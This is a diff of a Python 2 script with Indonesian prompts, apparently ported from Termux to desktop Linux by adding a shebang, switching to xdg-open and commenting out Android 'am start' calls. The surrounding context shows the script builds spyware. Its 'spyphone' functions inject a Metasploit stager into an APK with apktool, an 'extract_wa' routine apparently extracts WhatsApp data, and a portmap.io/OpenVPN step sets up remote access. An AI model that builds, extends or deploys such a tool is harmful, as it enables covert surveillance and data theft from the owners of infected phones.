@@ -1,3 +1,4 @@
+#!/usr/bin/python2
 # -*- coding: utf-8 -*-
 
 import os, sys
@@ -40,7 +41,7 @@ else :
     print '' 
     print 'buat akun portmap.io dulu'
     print '' 
-    os.system('termux-open https://portmap.io')
+    os.system('xdg-open https://portmap.io')
     time.sleep(1)
     exit()
   else :
@@ -60,7 +61,7 @@ else :
 			os.system('clear')
 			print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
 			time.sleep(2)
-			os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
+			#os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
 		else :
 			os.system('clear')
 			print 'Konfirmasi Salah!'
@@ -108,7 +109,7 @@ def spyphone_V14():
 	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/")
 	os.system("cd Malware && apktool b spyphone -o spyphone_V14.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
-	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+	#os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	os.system('mv -f Malware/spyphone_V14.apk /storage/emulated/0/')
 
 def spyphone():
@@ -122,7 +123,7 @@ def spyphone():
 	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit/")
 	os.system("cd Malware && apktool b spyphone -o spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
-	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+	#os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	os.system('mv -f Malware/spyphone.apk /storage/emulated/0/')
 		
 def extract_wa():
@@ -188,7 +189,7 @@ def extract_wa():
 	flush('cleaning..')
 	time.sleep(1)
 	os.system('rm -rf *txt')
-	os.system('am start --user 0 -n com.smeiti.wstotext/com.smeiti.wstotext.WStoTextActivity')
+	#os.system('am start --user 0 -n com.smeiti.wstotext/com.smeiti.wstotext.WStoTextActivity')
 	back()
 
 def awal():
@@ -311,7 +312,7 @@ def baru():
     time.sleep(4)
     os.system('mv '+str(name)+'.apk /storage/emulated/0/')
     time.sleep(4)
-    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+    #os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     home()
 
